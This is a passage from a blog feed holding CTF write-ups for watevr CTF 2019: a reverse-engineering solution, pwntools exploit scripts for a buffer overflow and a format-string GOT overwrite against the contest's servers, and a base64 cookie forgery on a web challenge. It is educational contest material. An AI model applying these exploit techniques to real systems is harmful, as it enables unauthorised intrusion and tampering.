&lt;p&gt;&lt;code&gt;strtok&lt;/code&gt; is used here, which is used to split the string at some delimiter. And also, &lt;code&gt;atol&lt;/code&gt; is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input &amp;ldquo;command&amp;rdquo; as space separated numbers.&lt;/p&gt;
&lt;p&gt;We use dynamic analysis after we give our input, since all the precomputations are done, we don&amp;rsquo;t have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of &lt;em&gt;10 11 12 13 14 15 16&lt;/em&gt;, the following parameters are passed -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x5555555551af (
   $rdi = 0x00007fffffffd370 → 0x000000000000000a,
   $rsi = 0x0000000000000040,
   $rdx = 0x0000000000000000,
   $rcx = 0x00007fffffffd350 → 0x000000000000008f
)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array&amp;rsquo;s pointer, with the first element as 0x8f.&lt;/p&gt;
&lt;p&gt;Now I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The parameters passed are -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x555555554dc3 (
   $rdi = 0x000000000000000a,    // inp
   $rsi = 0x0000000000000071,    // arr_ele2
   $rdx = 0x000000000000008f,    // arr_ele1
   $rcx = 0x0000000000000071
)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.&lt;/p&gt;
&lt;p&gt;This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; inp, ulong arr_ele2, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; mod) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
  
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; mod)) {
    inp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
      lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
      lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inp;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (inp &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(lVar1,(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,mod);
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;);
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
            lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(inp,arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,mod);
            lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
          }
        }
      }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; lVar1;
  }
                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
  exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
}


&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
  map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; m;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8f&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(m.find((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ans) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; m.end())
      m[(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ans] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt; i: m) {
    cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;i.first&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;i.second&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;endl;
  }
  string s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;give_me_the_flag_please&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c: s) {
    cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;m[c]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
  }
  cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;endl;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, what remains is to get the enoced values corresponding to &amp;ldquo;give_me_the_flag_please&amp;rdquo;. The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.&lt;/p&gt;
&lt;p&gt;The flag is - &lt;strong&gt;watevr{oops_1_f0rg0t_to_use_r4ndom_k3ys!_youtube.com/watch?v=BaACrT6Ydik}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
&lt;h2 id=&#34;voting-machine-1&#34;&gt;Voting Machine 1&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze&#34;&gt;kamikaze&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a buffer overflow challenge as gets has been used. There is a function &lt;code&gt;super_secret_function&lt;/code&gt;. We basically have to jump there as it prints the flag. Pretty straightforward.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The offset of the crash is calculated using gef&amp;rsquo;s pattern create and pattern search functionality.&lt;/p&gt;
&lt;p&gt;My exploit code -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kamikaze&amp;#34;&lt;/span&gt;)
e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./kamikaze&amp;#39;&lt;/span&gt;)
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.48.67.196&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)

func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400807&lt;/span&gt;

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(func)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_&lt;a href=&#34;https://www.youtube.com/watch?v=Va4aF6rRdqU%7D&#34;&gt;https://www.youtube.com/watch?v=Va4aF6rRdqU}&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;voting-machine-2&#34;&gt;Voting Machine 2&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze2&#34;&gt;kamikaze2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This binary had a format string vulnerability, since printf is being used without any format specifiers.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;I played around with the input for a while, realised that there was an alignment issue (of 2), when trying to get my input onto the stack variables. After this, we can see our input string at the 8th output (stack output due to format string bug) when supplied with &lt;code&gt;%x&lt;/code&gt;s. The objective here is to replace the exit call at the end of main (FUN_084207fb) with a function that reads the flag (FUN_08420736).&lt;/p&gt;
&lt;p&gt;After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.&lt;/p&gt;
&lt;p&gt;The final exploit code is -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kamikaze2&amp;#34;&lt;/span&gt;)
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.53.125.206&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08420736&lt;/span&gt;
main &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x084207fb&lt;/span&gt;
exit_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08422024&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pad&lt;/span&gt;(s):
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;len(s))

exploit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AA&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(exit_plt)
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(exit_plt&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BBBBCCCC&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%8$1828x&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%8$n&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%65804x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%9$n&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(pad(exploit))
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pad(exploit)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(pad(exploit))

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{GOT_som3_fl4g_for_you_&lt;a href=&#34;https://www.youtube.com/watch?v=hYeFcSq7Mxg%7D&#34;&gt;https://www.youtube.com/watch?v=hYeFcSq7Mxg}&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;other-categories&#34;&gt;Other categories&lt;/h1&gt;
&lt;h2 id=&#34;misc---unspaellablle&#34;&gt;Misc - Unspaellablle&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/orig.txt&#34;&gt;orig.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We are given a script for an episode of CHILDREN OF THE GODS by Jonathan Glassner &amp;amp; Brad Wright. Initially I had no clue how to proceed, but then I googled this episode and specifically for its transcript.&lt;/p&gt;
&lt;p&gt;I found it at &lt;a href=&#34;https://www.imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html&#34;&gt;IMSDb&lt;/a&gt;, and it was in the same format!!!&lt;/p&gt;
&lt;p&gt;After this it was just a matter of diffing using vimdiff to get the changed characters which was oir flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The flag is - &lt;strong&gt;watevr{icantspeel_tiny.cc/2qtdez}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;web---cookie-store&#34;&gt;Web - Cookie Store&lt;/h2&gt;
&lt;p&gt;Webpage - &lt;a href=&#34;http://13.48.71.231:50000/&#34;&gt;http://13.48.71.231:50000/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The page has a cookie - &lt;strong&gt;eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==&lt;/strong&gt;, on decoding - &lt;strong&gt;{&amp;ldquo;money&amp;rdquo;: 50, &amp;ldquo;history&amp;rdquo;: []}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We see that the &lt;em&gt;Flag&lt;/em&gt; cookie is for 100$, so if we set the cookie to base64({&amp;ldquo;money&amp;rdquo;: 200, &amp;ldquo;history&amp;rdquo;: []}), i.e. &lt;strong&gt;eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=&lt;/strong&gt;.  With this our balance gets updated. Now we can buy the flag cookie and get the flag.&lt;/p&gt;
&lt;p&gt;The flag is - &lt;strong&gt;watevr{b64_15_4_6r347_3ncryp710n_m37h0d}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;That&amp;rsquo;s all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn&amp;rsquo;t solve. I will add my version of their writeups when I get to know their solution.&lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;a id=&#34;openpopup&#34; class=&#34;example_a&#34; rel=&#34;nofollow noopener&#34;&gt;Subscribe to my posts!&lt;/a&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TUCTF 2019 - Pwn &amp; Rev Challenges</title>
      <link>https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/</link>
      <pubDate>Mon, 02 Dec 2019 19:39:57 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/</guid>
      <description>&lt;p&gt;I couldn&amp;rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.&lt;/p&gt;
&lt;hr&gt;
